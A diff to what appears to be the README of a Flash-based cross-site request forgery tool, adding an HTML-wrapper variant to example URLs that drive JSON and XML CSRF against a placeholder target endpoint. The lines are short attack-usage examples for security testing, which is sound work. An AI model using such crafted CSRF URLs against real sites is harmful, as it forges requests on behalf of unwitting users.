@@ -32,6 +32,10 @@ If you have the questions regarding this repository - ping me in the Twitter: [@
 ```
 https://example.com/test.swf?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
 ```
+or, using HTML wrapper:
+```
+https://example.com/read.html?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
+```
 2) Exploit XML CSRF, POST-based:
 ```
 https://example.com/test.swf?jsonData=[xmldada]&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint&ct=application/xml
